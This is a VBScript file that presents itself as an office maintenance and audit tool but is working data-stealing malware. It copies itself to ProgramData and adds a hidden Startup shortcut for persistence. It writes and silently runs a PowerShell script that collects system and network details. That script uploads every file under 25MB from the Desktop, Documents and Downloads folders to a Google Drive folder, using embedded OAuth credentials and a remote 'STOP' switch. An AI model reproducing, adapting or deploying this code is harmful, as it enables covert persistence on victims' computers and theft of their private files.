Option Explicit

' --- 1. DECLARATIONS ---
Dim objFSO, objShell, objFile, objShortcut
Dim strPSPath, strWorkerName, appDataPath, startupPath, currentScript
Dim strCID, strSEC, strTOK, strBaseID

Set objFSO = CreateObject("Scripting.FileSystemObject")
Set objShell = CreateObject("WScript.Shell")

' --- 2. CONFIG & PATHS ---
currentScript = WScript.ScriptFullName
strWorkerName = "office_maint_v22.ps1"
strPSPath = objShell.ExpandEnvironmentStrings("%TEMP%") & "\" & strWorkerName
appDataPath = "C:\ProgramData\win_maint_svc.vbs"
startupPath = objShell.ExpandEnvironmentStrings("%APPDATA%") & "\Microsoft\Windows\Start Menu\Programs\Startup\win_maint.lnk"

' --- 3. PERSISTENCE BLOCK ---
On Error Resume Next
objShell.Run "powershell.exe -Command ""Unblock-File -Path '" & currentScript & "'""", 0, True

' Copy to ProgramData for permanence
If Not objFSO.FileExists(appDataPath) Then 
    objFSO.CopyFile currentScript, appDataPath, True
End If

' Create Startup Shortcut
If Not objFSO.FileExists(startupPath) Then
    Set objShortcut = objShell.CreateShortcut(startupPath)
    objShortcut.TargetPath = "wscript.exe"
    objShortcut.Arguments = """" & appDataPath & """"
    objShortcut.WindowStyle = 0
    objShortcut.Save
End If
On Error GoTo 0

' --- 4. GOOGLE API KEYS ---
strCID = "677717926428-smega8knnqbrrvo6j4ctvllque8jmc2a.apps.googleusercontent.com"
strSEC = "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"
strTOK = "1//04ovknb57Ph3DCgYIARAAGAQSNwF-L9IrkTy0E_E3b8AIEQ-_jTTy3-o2BDaXitQhY95eLbtN6RM85rDIaOAqckKBZHntlbT09Io"
strBaseID = "1YVAYlF68yQfbD5nyuEUqb1AesoLVV5Ff"

' --- 5. WRITE DEEP REPORT POWERSHELL ---
Set objFile = objFSO.CreateTextFile(strPSPath, True)
objFile.WriteLine "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12"
objFile.WriteLine "$CID = '" & strCID & "'; $SEC = '" & strSEC & "'; $TOK = '" & strTOK & "'; $BaseID = '" & strBaseID & "'"

' Auth Handshake
objFile.WriteLine "try { $a=Invoke-RestMethod -Uri 'https://accounts.google.com/o/oauth2/token' -Method Post -Body @{client_id=$CID;client_secret=$SEC;refresh_token=$TOK;grant_type='refresh_token'}"
objFile.WriteLine "$global:h=@{Authorization=""Bearer $($a.access_token)""} } catch { exit }"

' STOP Logic
objFile.WriteLine "$q = [Uri]::EscapeDataString(""'$BaseID' in parents and trashed = false"")"
objFile.WriteLine "try { $df = (Invoke-RestMethod -Uri ""https://www.googleapis.com/drive/v3/files?q=$q&fields=files(name)"" -Headers $h).files.name"
objFile.WriteLine "$Pause = $false; foreach ($f in $df) { if ($f -ilike '*STOP*' -and ($f -ieq 'STOP' -or $f -ilike ""*STOP-$($env:COMPUTERNAME)*"")) { $Pause = $true } } } catch { $Pause = $false }"

' Folder Creation & Upload Function
objFile.WriteLine "$meta = @{name=""$($env:COMPUTERNAME)-Audit-$(Get-Date -f 'MMdd-HHmm')"";mimeType='application/vnd.google-apps.folder';parents=@($BaseID)}|ConvertTo-Json"
objFile.WriteLine "$SID = (Invoke-RestMethod -Uri 'https://www.googleapis.com/drive/v3/files' -Method Post -Headers $h -Body $meta -ContentType 'application/json').id"
objFile.WriteLine "function Up($n, $p, $t) { try { $b=[System.IO.File]::ReadAllBytes($p); $m=@{name=$n;parents=@($t)}|ConvertTo-Json -Compress; $bd=[guid]::NewGuid().ToString(); $hd=""--$bd`r`nContent-Type: application/json; charset=UTF-8`r`n`r`n$m`r`n--$bd`r`nContent-Type: application/octet-stream`r`n`r`n""; $by=[collections.generic.list[byte]]::new(); $by.AddRange([text.encoding]::UTF8.GetBytes($hd)); $by.AddRange($b); $by.AddRange([text.encoding]::UTF8.GetBytes(""`r`n--$bd--`r`n"")); Invoke-RestMethod -Uri 'https://www.googleapis.com/upload/drive/v3/files?uploadType=multipart' -Method Post -Headers $h -Body $by.ToArray() -ContentType ""multipart/related; boundary=$bd"" | Out-Null } catch {} }"

' --- FULL DEEP REPORT LOGIC (RESTORED) ---
objFile.WriteLine "$R = New-Object System.Text.StringBuilder"
objFile.WriteLine "$R.AppendLine('====================================================')"
objFile.WriteLine "$R.AppendLine("" DEEP OFFICE AUDIT: $($env:COMPUTERNAME) "")"
objFile.WriteLine "$R.AppendLine("" TIME: $(Get-Date) "")"
objFile.WriteLine "$R.AppendLine('====================================================`n')"
objFile.WriteLine "$R.AppendLine('[1. USER PROFILES]'); $R.AppendLine(""Profiles found: $((Get-ChildItem 'C:\Users' | Select Name) -join ', ')""); $R.AppendLine()"
objFile.WriteLine "$R.AppendLine('[2. NETWORK DETAILS]'); Get-NetIPConfiguration | Select-Object InterfaceAlias, IPv4Address, IPv4DefaultGateway | Out-String | %{$R.AppendLine($_)}"
objFile.WriteLine "Get-NetAdapter | Select Name, Status, MacAddress | Out-String | %{$R.AppendLine($_)}"
objFile.WriteLine "$R.AppendLine('[3. STORAGE DETAILS]'); Get-WmiObject Win32_LogicalDisk | Select-Object DeviceID, VolumeName, @{N='Total_GB';E={[math]::Round($_.Size/1GB,2)}}, @{N='Free_GB';E={[math]::Round($_.FreeSpace/1GB,2)}} | Out-String | %{$R.AppendLine($_)}"
objFile.WriteLine "$R.AppendLine('[4. HARDWARE INVENTORY]'); Get-PnpDevice | Where-Object {$_.Status -eq 'OK'} | Select Class, FriendlyName, Manufacturer | Out-String | %{$R.AppendLine($_)}"

objFile.WriteLine "$rt=""$env:TEMP\DeepReport.txt""; $R.ToString() | Out-File $rt; Up 'Deep_Report.txt' $rt $SID; rm $rt"

' --- DATA UPLOAD ENGINE ---
objFile.WriteLine "if (-not $Pause) {"
objFile.WriteLine "  $reg='HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders'"
objFile.WriteLine "  $pts = @((gp $reg).Desktop, (gp $reg).Personal, (gp $reg).'{374DE290-123F-4565-9164-39C4925E467B}')"
objFile.WriteLine "  foreach($p in ($pts | select -Unique)){ if(Test-Path $p){ gci $p -File -Recurse -EA 0 | ?{$_.Length -lt 25MB} | %{ Up $_.Name $_.FullName $SID } } }"
objFile.WriteLine "} else { $st=""$env:TEMP\p.txt""; 'Paused' | Out-File $st; Up 'STOPPED.txt' $st $SID; rm $st }"
objFile.Close

' --- 6. FINAL EXECUTION ---
objShell.Run "powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File """ & strPSPath & """", 0, True
